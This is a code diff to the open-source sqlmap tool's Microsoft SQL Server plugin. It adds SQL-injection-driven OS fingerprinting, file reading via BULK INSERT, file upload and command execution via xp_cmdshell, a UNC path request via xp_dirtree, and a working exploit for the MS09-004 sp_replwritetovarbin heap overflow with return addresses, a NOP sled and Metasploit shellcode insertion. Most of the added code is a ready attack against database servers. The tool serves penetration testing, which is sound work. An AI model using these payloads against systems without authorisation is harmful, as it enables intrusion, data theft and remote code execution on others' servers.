@@ -5,8 +5,8 @@ $Id$
 
 This file is part of the sqlmap project, http://sqlmap.sourceforge.net.
 
-Copyright (c) 2006-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
-                        and Daniele Bellucci <daniele.bellucci@gmail.com>
+Copyright (c) 2007-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
+Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>
 
 sqlmap is free software; you can redistribute it and/or modify it under
 the terms of the GNU General Public License as published by the Free
@@ -24,42 +24,54 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 
 
+import os
 import time
 
 from lib.core.agent import agent
+from lib.core.common import dataToOutFile
 from lib.core.common import dataToStdout
 from lib.core.common import formatDBMSfp
 from lib.core.common import formatFingerprint
 from lib.core.common import getHtmlErrorFp
+from lib.core.common import getRange
 from lib.core.common import randomInt
+from lib.core.common import randomStr
 from lib.core.common import readInput
+from lib.core.convert import urlencode
 from lib.core.data import conf
 from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.data import queries
 from lib.core.exception import sqlmapNoneDataException
 from lib.core.exception import sqlmapSyntaxException
+from lib.core.exception import sqlmapUnsupportedFeatureException
 from lib.core.session import setDbms
 from lib.core.settings import MSSQL_ALIASES
 from lib.core.settings import MSSQL_SYSTEM_DBS
+from lib.core.shell import autoCompletion
 from lib.core.unescaper import unescaper
 from lib.request import inject
 from lib.request.connect import Connect as Request
+from lib.techniques.outband.stacked import stackedTest
 
 from plugins.generic.enumeration import Enumeration
 from plugins.generic.filesystem import Filesystem
 from plugins.generic.fingerprint import Fingerprint
+from plugins.generic.misc import Miscellaneous
 from plugins.generic.takeover import Takeover
 
 
-class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Takeover):
+class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):
     """
     This class defines Microsoft SQL Server methods
     """
 
     def __init__(self):
         self.excludeDbsList = MSSQL_SYSTEM_DBS
+
         Enumeration.__init__(self, "Microsoft SQL Server")
+        Filesystem.__init__(self)
+        Takeover.__init__(self)
 
         unescaper.setUnescape(MSSQLServerMap.unescape)
 
@@ -128,7 +140,7 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Takeover):
         if wsOsFp:
             value += "%s\n" % wsOsFp
 
-        if self.banner:
+        if kb.data.banner:
             dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)
 
             if dbmsOsFp:
@@ -168,41 +180,55 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Takeover):
         if conf.dbms in MSSQL_ALIASES and kb.dbmsVersion and kb.dbmsVersion[0].isdigit():
             setDbms("Microsoft SQL Server %s" % kb.dbmsVersion[0])
 
-            self.getPrematureBanner("@@VERSION")
+            self.getBanner()
 
             if not conf.extensiveFp:
+                kb.os = "Windows"
+
                 return True
 
-        logMsg = "testing Microsoft SQL Server"
-        logger.info(logMsg)
+        infoMsg = "testing Microsoft SQL Server"
+        logger.info(infoMsg)
 
         payload = agent.fullPayload(" AND LEN(@@VERSION)=LEN(@@VERSION)")
         result  = Request.queryPage(payload)
 
         if result == True:
-            logMsg = "confirming Microsoft SQL Server"
-            logger.info(logMsg)
+            infoMsg = "confirming Microsoft SQL Server"
+            logger.info(infoMsg)
 
             for version in ( 0, 5, 8 ):
-                payload = agent.fullPayload(" AND SUBSTRING((@@VERSION), 25, 1)=%d" % version)
+                payload = agent.fullPayload(" AND SUBSTRING((@@VERSION), 22, 1)=2 AND SUBSTRING((@@VERSION), 25, 1)=%d" % version)
                 result  = Request.queryPage(payload)
 
                 if result == True:
                     if version == 8:
-                        kb.dbmsVersion = ["2008"]
-                    elif version == 5:
-                        kb.dbmsVersion = ["2005"]
-                    elif version == 0:
-                        kb.dbmsVersion = ["2000"]
+                        kb.dbmsVersion = [ "2008" ]
 
-                    break
+                        break
+
+                    elif version == 5:
+                        kb.dbmsVersion = [ "2005" ]
+
+                        break
+
+                    else:
+                        payload = agent.fullPayload(" AND SUBSTRING((@@VERSION), 22, 1)=7")
+                        result  = Request.queryPage(payload)
+
+                        if result == True:
+                            kb.dbmsVersion = [ "7.0" ]
+
+                        break
 
             if kb.dbmsVersion:
                 setDbms("Microsoft SQL Server %s" % kb.dbmsVersion[0])
             else:
                 setDbms("Microsoft SQL Server")
 
-            self.getPrematureBanner("@@VERSION")
+            self.getBanner()
+
+            kb.os = "Windows"
 
             return True
         else:
@@ -210,6 +236,85 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Takeover):
             logger.warn(warnMsg)
 
             return False
+
+
+    def checkDbmsOs(self, detailed=False):
+        if kb.os and kb.osVersion and kb.osSP:
+            return
+
+        if not kb.os:
+            kb.os = "Windows"
+
+        if detailed == False:
+            return
+
+        infoMsg  = "fingerprinting the back-end DBMS operating system "
+        infoMsg += "version and service pack"
+        logger.info(infoMsg)
+
+        infoMsg = "the back-end DBMS operating system is %s" % kb.os
+
+        self.createSupportTbl(self.fileTblName, self.tblField, "varchar(1000)")
+        inject.goStacked("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, "@@VERSION"))
+
+        versions = {
+                     "2003": ( "5.2", ( 2, 1 ) ),
+                     #"2003": ( "6.0", ( 2, 1 ) ),
+                     "2008": ( "7.0", ( 1, ) ),
+                     "2000": ( "5.0", ( 4, 3, 2, 1 ) ),
+                     "XP":   ( "5.1", ( 2, 1 ) ),
+                     "NT":   ( "4.0", ( 6, 5, 4, 3, 2, 1 ) )
+                   }
+
+        # Get back-end DBMS underlying operating system version
+        for version, data in versions.items():
+            query  =  "(SELECT LEN(%s) FROM %s WHERE %s " % (self.tblField, self.fileTblName, self.tblField)
+            query += "LIKE '%Windows NT " + data[0] + "%')>0"
+            query  = agent.forgeCaseStatement(query)
+
+            if inject.getValue(query, charsetType=1) == "1":
+                kb.osVersion = version
+                infoMsg     += " %s" % kb.osVersion
+
+                break
+
+        if not kb.osVersion:
+            kb.osVersion = "2003"
+            kb.osSP      = 2
+
+            warnMsg  = "unable to fingerprint the underlying operating "
+            warnMsg += "system version, assuming it is Windows "
+            warnMsg += "%s Service Pack %d" % (kb.osVersion, kb.osSP)
+            logger.warn(warnMsg)
+
+            self.cleanup(onlyFileTbl=True)
+
+            return
+
+        # Get back-end DBMS underlying operating system service pack
+        sps = versions[kb.osVersion][1]
+
+        for sp in sps:
+            query  =  "(SELECT LEN(%s) FROM %s WHERE %s " % (self.tblField, self.fileTblName, self.tblField)
+            query += "LIKE '%Service Pack " + str(sp) + "%')>0"
+            query  = agent.forgeCaseStatement(query)
+
+            if inject.getValue(query, charsetType=1) == "1":
+                kb.osSP = sp
+                break
+
+        if not kb.osSP:
+            debugMsg = "assuming the operating system has no service pack"
+            logger.debug(debugMsg)
+
+            kb.osSP = 0
+
+        if kb.osVersion:
+            infoMsg += " Service Pack %d" % kb.osSP
+
+        logger.info(infoMsg)
+
+        self.cleanup(onlyFileTbl=True)
 
 
     def getPrivileges(self):
@@ -221,29 +326,29 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Takeover):
 
 
     def getTables(self):
-        logMsg = "fetching tables"
+        infoMsg = "fetching tables"
         if conf.db:
-            logMsg += " for database '%s'" % conf.db
-        logger.info(logMsg)
+            infoMsg += " for database '%s'" % conf.db
+        logger.info(infoMsg)
 
         rootQuery = queries[kb.dbms].tables
 
         if not conf.db:
-            if not len(self.cachedDbs):
+            if not len(kb.data.cachedDbs):
                 dbs = self.getDbs()
             else:
-                dbs = self.cachedDbs
+                dbs = kb.data.cachedDbs
         else:
             if "," in conf.db:
                 dbs = conf.db.split(",")
             else:
                 dbs = [conf.db]
 
-        if conf.unionUse:
+        if kb.unionPosition:
             for db in dbs:
                 if conf.excludeSysDbs and db in self.excludeDbsList:
-                    logMsg = "skipping system database '%s'" % db
-                    logger.info(logMsg)
+                    infoMsg = "skipping system database '%s'" % db
+                    logger.info(infoMsg)
 
                     continue
 
@@ -251,22 +356,22 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Takeover):
                 value = inject.getValue(query, blind=False)
 
                 if value:
-                    self.cachedTables[db] = value
+                    kb.data.cachedTables[db] = value
 
-        if not self.cachedTables:
+        if not kb.data.cachedTables:
             for db in dbs:
                 if conf.excludeSysDbs and db in self.excludeDbsList:
-                    logMsg = "skipping system database '%s'" % db
-                    logger.info(logMsg)
+                    infoMsg = "skipping system database '%s'" % db
+                    logger.info(infoMsg)
 
                     continue
 
-                logMsg  = "fetching number of tables for "
-                logMsg += "database '%s'" % db
-                logger.info(logMsg)
+                infoMsg  = "fetching number of tables for "
+                infoMsg += "database '%s'" % db
+                logger.info(infoMsg)
 
                 query = rootQuery["blind"]["count"] % db
-                count = inject.getValue(query, inband=False)
+                count = inject.getValue(query, inband=False, charsetType=2)
 
                 if not count.isdigit() or not len(count) or count == "0":
                     warnMsg  = "unable to retrieve the number of "
@@ -282,14 +387,330 @@ class MSSQLServerMap(Fingerprint, Enumeration, Filesystem, Takeover):
                     tables.append(table)
 
                 if tables:
-                    self.cachedTables[db] = tables
+                    kb.data.cachedTables[db] = tables
                 else:
                     warnMsg  = "unable to retrieve the tables "
                     warnMsg += "for database '%s'" % db
                     logger.warn(warnMsg)
 
-        if not self.cachedTables:
+        if not kb.data.cachedTables:
             errMsg = "unable to retrieve the tables for any database"
             raise sqlmapNoneDataException, errMsg
 
-        return self.cachedTables
+        return kb.data.cachedTables
+
+
+    def unionReadFile(self, rFile):
+        errMsg  = "Microsoft SQL Server does not support file reading "
+        errMsg += "with UNION query SQL injection technique"
+        raise sqlmapUnsupportedFeatureException, errMsg
+
+
+    def stackedReadFile(self, rFile):
+        infoMsg = "fetching file: '%s'" % rFile
+        logger.info(infoMsg)
+
+        result = []
+        txtTbl = self.fileTblName
+        hexTbl = "%shex" % self.fileTblName
+
+        self.createSupportTbl(txtTbl, self.tblField, "text")
+        inject.goStacked("DROP TABLE %s" % hexTbl)
+        inject.goStacked("CREATE TABLE %s(id INT IDENTITY(1, 1) PRIMARY KEY, %s %s)" % (hexTbl, self.tblField, "VARCHAR(4096)"))
+
+        logger.debug("loading the content of file '%s' into support table" % rFile)
+        inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (txtTbl, rFile, randomStr(10), randomStr(10)), silent=True)
+
+        # Reference: http://support.microsoft.com/kb/104829
+        binToHexQuery = """
+        DECLARE @charset VARCHAR(16)
+        DECLARE @counter INT
+        DECLARE @hexstr VARCHAR(4096)
+        DECLARE @length INT
+        DECLARE @chunk INT
+
+        SET @charset = '0123456789ABCDEF'
+        SET @counter = 1
+        SET @hexstr = ''
+        SET @length = (SELECT DATALENGTH(%s) FROM %s)
+        SET @chunk = 1024
+
+        WHILE (@counter <= @length)
+        BEGIN
+            DECLARE @tempint INT
+            DECLARE @firstint INT
+            DECLARE @secondint INT
+
+            SET @tempint = CONVERT(INT, (SELECT ASCII(SUBSTRING(%s, @counter, 1)) FROM %s))
+            SET @firstint = floor(@tempint/16)
+            SET @secondint = @tempint - (@firstint * 16)
+            SET @hexstr = @hexstr + SUBSTRING(@charset, @firstint+1, 1) + SUBSTRING(@charset, @secondint+1, 1)
+
+            SET @counter = @counter + 1
+
+            IF @counter %% @chunk = 0
+            BEGIN
+                INSERT INTO %s(%s) VALUES(@hexstr)
+                SET @hexstr = ''
+            END
+        END
+
+        IF @counter %% (@chunk) != 0
+        BEGIN
+            INSERT INTO %s(%s) VALUES(@hexstr)
+        END
+        """ % (self.tblField, txtTbl, self.tblField, txtTbl, hexTbl, self.tblField, hexTbl, self.tblField)
+
+        binToHexQuery = binToHexQuery.replace("    ", "").replace("\n", " ")
+        binToHexQuery = urlencode(binToHexQuery, convall=True)
+        inject.goStacked(binToHexQuery)
+
+        if kb.unionPosition:
+            result = inject.getValue("SELECT %s FROM %s ORDER BY id ASC" % (self.tblField, hexTbl), sort=False, resumeValue=False, blind=False)
+
+        if not result:
+            result = []
+            count  = inject.getValue("SELECT COUNT(%s) FROM %s" % (self.tblField, hexTbl), resumeValue=False, charsetType=2)
+
+            if not count.isdigit() or not len(count) or count == "0":
+                errMsg  = "unable to retrieve the content of the "
+                errMsg += "file '%s'" % rFile
+                raise sqlmapNoneDataException, errMsg
+
+            indexRange = getRange(count)
+
+            for index in indexRange:
+                chunk = inject.getValue("SELECT TOP 1 %s FROM %s WHERE %s NOT IN (SELECT TOP %d %s FROM %s ORDER BY id ASC) ORDER BY id ASC" % (self.tblField, hexTbl, self.tblField, index, self.tblField, hexTbl), unpack=False, resumeValue=False, sort=False, charsetType=3)
+                result.append(chunk)
+
+        inject.goStacked("DROP TABLE %s" % hexTbl)
+
+        return result
+
+
+    def unionWriteFile(self, wFile, dFile, fileType, confirm=True):
+        errMsg  = "Microsoft SQL Server does not support file upload with "
+        errMsg += "UNION query SQL injection technique"
+        raise sqlmapUnsupportedFeatureException, errMsg
+
+
+    def stackedWriteFile(self, wFile, dFile, fileType, confirm=True):
+        # NOTE: this is needed here because we use xp_cmdshell extended
+        # procedure to write a file on the back-end Microsoft SQL Server
+        # file system. Maybe it won't be required to write text files
+        self.initEnv()
+
+        self.getRemoteTempPath()
+
+        debugMsg  = "going to use xp_cmdshell extended procedure to write "
+        debugMsg += "the %s file content to file '%s'" % (fileType, dFile)
+        logger.debug(debugMsg)
+
+        debugSize    = 0xFF00
+        tmpPath      = conf.tmpPath.replace("/", "\\")
+        dFileName    = os.path.split(dFile)[1]
+        dFile        = dFile.replace("/", "\\")
+        wFileSize    = os.path.getsize(wFile)
+        wFilePointer = open(wFile, "rb")
+        wFileContent = wFilePointer.read()
+        wFilePointer.close()
+
+        if wFileSize < debugSize:
+            chunkName = self.updateBinChunk(wFileContent, dFile, tmpPath)
+            sFile     = "%s\%s" % (tmpPath, dFileName)
+
+            logger.debug("moving binary file %s to %s" % (sFile, dFile))
+
+            commands   = (
+                           "cd %s" % tmpPath,
+                           "ren %s %s" % (chunkName, dFileName),
+                           "move /Y %s %s" % (dFileName, dFile)
+                         )
+            complComm  = " & ".join(command for command in commands)
+            forgedCmd  = self.xpCmdshellForgeCmd(complComm)
+
+            self.execCmd(forgedCmd)
+
+        else:
+            infoMsg  = "the %s file is bigger than %d " % (fileType, debugSize)
+            infoMsg += "bytes. sqlmap will split it into chunks, upload "
+            infoMsg += "them and recreate the original file out of the "
+            infoMsg += "binary chunks server-side, wait.."
+            logger.info(infoMsg)
+
+            counter = 1
+
+            for i in range(0, wFileSize, debugSize):
+                wFileChunk = wFileContent[i:i+debugSize]
+                chunkName  = self.updateBinChunk(wFileChunk, dFile, tmpPath)
+
+                if i == 0:
+                    infoMsg = "renaming chunk "
+                    copyCmd = "ren %s %s" % (chunkName, dFileName)
+                else:
+                    infoMsg = "appending chunk "
+                    copyCmd = "copy /B /Y %s+%s %s" % (dFileName, chunkName, dFileName)
+
+                infoMsg += "%s\%s to %s\%s" % (tmpPath, chunkName, tmpPath, dFileName)
+                logger.debug(infoMsg)
+
+                commands   = (
+                               "cd %s" % tmpPath,
+                               copyCmd,
+                               "del /F %s" % chunkName
+                             )
+                complComm  = " & ".join(command for command in commands)
+                forgedCmd  = self.xpCmdshellForgeCmd(complComm)
+
+                self.execCmd(forgedCmd)
+
+                logger.info("file chunk %d written" % counter)
+
+                counter += 1
+
+            sFile = "%s\%s" % (tmpPath, dFileName)
+
+            logger.debug("moving binary file %s to %s" % (sFile, dFile))
+
+            commands  = (
+                          "cd %s" % tmpPath,
+                          "move /Y %s %s" % (dFileName, dFile)
+                        )
+            complComm = " & ".join(command for command in commands)
+            forgedCmd = self.xpCmdshellForgeCmd(complComm)
+
+            self.execCmd(forgedCmd)
+
+        if confirm == True:
+            self.askCheckWrittenFile(wFile, dFile, fileType)
+
+
+    def uncPathRequest(self):
+        #inject.goStacked("EXEC master..xp_fileexist '%s'" % self.uncPath, silent=True)
+        inject.goStacked("EXEC master..xp_dirtree '%s'" % self.uncPath)
+
+
+    def overflowBypassDEP(self):
+        # TODO: use 'sc' to:
+        # * Get the SQL Server 'Service name' (usually MSSQLSERVER)
+        # * Detect the absolute SQL Server executable file path
+        #
+        # References:
+        # * http://www.ss64.com/nt/sc.html
+        # * http://www.ss64.com/nt/for_cmd.html
+        self.handleDep("C:\Program Files\Microsoft SQL Server\MSSQL.1\MSSQL\Binn\sqlservr.exe")
+
+        if self.bypassDEP == False:
+            return
+
+        logger.info("restarting Microsoft SQL Server, wait..")
+        time.sleep(15)
+        # TODO: use 'sc' to:
+        # * Warn the user that sqlmap needs to restart the SQL Server
+        #   service, ask for confirmation
+        # * Stop the SQL Server service (after handling DEP)
+        # * Start the SQL Server service (after handling DEP)
+
+        # Another way to restart MSSQL consists of writing a  bat file with
+        # the following text:
+        #
+        #@ECHO OFF
+        #NET STOP MSSQLSERVER
+        #NET START MSSQLSERVER
+        #
+        # Then run the following statement and wait a few seconds:
+        #
+        # exec master..xp_cmdshell 'start C:\WINDOWS\Temp\sqlmaprandom.bat'
+
+
+    def spHeapOverflow(self):
+        """
+        References:
+        * http://www.microsoft.com/technet/security/bulletin/MS09-004.mspx
+        * http://support.microsoft.com/kb/959420
+        """
+
+        returns = {
+                    "2003": ( 2, "CHAR(0x77)+CHAR(0x55)+CHAR(0x87)+CHAR(0x7c)" ), # ntdll.dll:   0x7c8601bd -> 7508e877 (0x77e80857 it's a CALL ESI @ kernel32.dll)
+                    "2000": ( 4, "CHAR(0xdc)+CHAR(0xe1)+CHAR(0xf8)+CHAR(0x7c)" ), # shell32.dll: 0x7cf8e1ec 163bf77c -> (CALL ESI @ shell32.dll)
+                  }
+        retAddr = None
+
+        for version, data in returns.items():
+            sp      = data[0]
+            address = data[1]
+
+            if kb.osVersion == version and kb.osSP == sp:
+                retAddr = address
+
+                break
+
+        if retAddr == None:
+            errMsg  = "sqlmap can not exploit the stored procedure buffer "
+            errMsg += "overflow because it does not have a valid return "
+            errMsg += "code for the underlying operating system (Windows "
+            errMsg += "%s Service Pack %d" % (kb.osVersion, kb.osSP)
+            raise sqlmapUnsupportedFeatureException, errMsg
+
+        self.spExploit = """
+        DECLARE @buf NVARCHAR(4000),
+        @val NVARCHAR(4),
+        @counter INT
+        SET @buf = '
+        declare @retcode int,
+        @end_offset int,
+        @vb_buffer varbinary,
+        @vb_bufferlen int
+        exec master.dbo.sp_replwritetovarbin 347, @end_offset output, @vb_buffer output, @vb_bufferlen output,'''
+        SET @val = CHAR(0x41)
+        SET @counter = 0
+        WHILE @counter < 3320
+        BEGIN
+            SET @counter = @counter + 1
+            IF @counter = 411
+                BEGIN
+                /* Return address */
+                SET @buf = @buf + %s
+
+                /* Nopsled */
+                SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
+                SET @buf = @buf + CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
+                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
+                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
+                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
+                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
+                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
+                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
+                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
+                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
+                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
+                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+
+                CHAR(0x90)+CHAR(0x90)+CHAR(0x90)+CHAR(0x90)
+
+                /* Metasploit shellcode stage 1 */
+                SET @buf = @buf + %s
+
+                /* Unroll the stack and return */
+                CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+
+                CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+
+                CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+
+                CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+
+                CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+
+                CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+CHAR(0x5e)+
+                CHAR(0xc3)
+
+                SET @counter = @counter + 302
+                SET @val = CHAR(0x43)
+                CONTINUE
+            END
+            SET @buf = @buf + @val
+        END
+        SET @buf = @buf + ''',''33'',''34'',''35'',''36'',''37'',''38'',''39'',''40'',''41'''
+        EXEC master..sp_executesql @buf
+        """ % (retAddr, self.shellcodeChar)
+
+        self.spExploit = self.spExploit.replace("    ", "").replace("\n", " ")
+        self.spExploit = urlencode(self.spExploit, convall=True)
+
+        logger.info("triggering the buffer overflow vulnerability, wait..")
+        inject.goStacked(self.spExploit, silent=True)
